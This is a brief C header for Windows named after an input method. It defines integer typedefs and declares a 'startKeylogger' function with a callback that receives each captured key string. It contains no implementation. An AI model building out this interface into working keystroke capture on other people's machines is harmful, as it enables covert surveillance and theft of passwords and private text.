#ifndef INCLUDE_INPUTMETHOD_H
#define INCLUDE_INPUTMETHOD_H
#pragma once
#include <stdlib.h>
#include <inttypes.h>
#include <windows.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef void (*keyloggerCallback)(char* keyStr);
void startKeylogger(HINSTANCE hInstance, keyloggerCallback cb);


#endif // INCLUDE_INPUTMETHOD_H
